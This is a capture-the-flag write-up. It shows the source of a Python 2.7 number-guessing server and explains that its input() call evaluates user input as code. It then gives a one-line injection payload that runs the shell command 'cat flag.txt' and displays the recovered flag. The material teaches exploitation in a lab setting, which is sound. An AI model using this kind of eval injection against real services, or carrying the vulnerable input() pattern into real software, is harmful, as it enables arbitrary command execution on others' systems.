# Guess It Forever

![chal](challenge.png)


### Python 2.7 - Command Injection Vulnerability in *Input()*

```python
#!/usr/bin/python2.7
from random import randint

def menu():
        print("Options")
        print("1. Guess the flag")
        print("2. Get a random number")
        print("3. quit")

FLAG = open("flag.txt", "r").read()
MAX = 10**12

i = 0
while i < 500:
        menu()
        try:
                opt = int(input("> "))
                if opt == 1:
                        guess = int(input("What is the number: "))
                        num = randint(1, MAX)
                        if guess == num:
                                print("Here is your flag %s" % FLAG)
                                quit()
                        else:
                                print("Incorrect")
                elif opt == 2:
                        print("Here is a random number %d" % randint(1, MAX))
                elif opt == 3:
                        print("Goodbye")
                        quit()
                else:
                        print("That is not an option")
                        i -= 1
                i += 1

        except (TypeError, NameError) as e:
                print("Why error")

```

Here we can see the source code to the application running on the server and at first sight it looks like we have a crypto problem but after looking closer at the code we can see that it's written in Python2.7 and it uses the *input()* function. **In Python 2.x, the input() function is equivalent to eval(raw_input).** Here is our vulnerability

```
> 1
What is the number: __import__('os').system('cat flag.txt')
gg{Python3_>_Python2}
Incorrect
Options
1. Guess the flag
2. Get a random number
3. quit
>
```

`FLAG: gg{Python3_>_Python2}`
